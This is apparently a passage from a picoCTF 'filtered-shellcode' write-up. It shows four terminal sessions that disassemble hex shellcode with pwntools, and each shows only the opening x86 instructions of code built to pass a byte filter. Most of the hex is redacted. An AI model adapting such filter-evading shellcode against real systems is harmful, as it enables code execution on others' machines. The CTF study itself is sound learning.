...
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]31C0B004B301CD8093CD80"
   0:    31 c9                    xor    ecx,  ecx
   2:    f7 e1                    mul    ecx
   4:    b0 05                    mov    al,  0x5
   6:    51                       push   ecx
...
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]"
   0:    31 c0                    xor    eax,  eax
   2:    31 db                    xor    ebx,  ebx
   4:    b0 11                    mov    al,  0x11
   6:    b3 03                    mov    bl,  0x3
...
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]B313F7E3B305F7E3B302F7E35B90F7E35090"
   0:    31 c0                    xor    eax,  eax
   2:    31 db                    xor    ebx,  ebx
   4:    b0 2f                    mov    al,  0x2f
   6:    f7 e0                    mul    eax
...
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "[AWS_SECRET_REMOVED]29C25890"
   0:    50                       push   eax
   1:    90                       nop
   2:    31 c0                    xor    eax,  eax
   4:    31 d2                    xor    edx,  edx
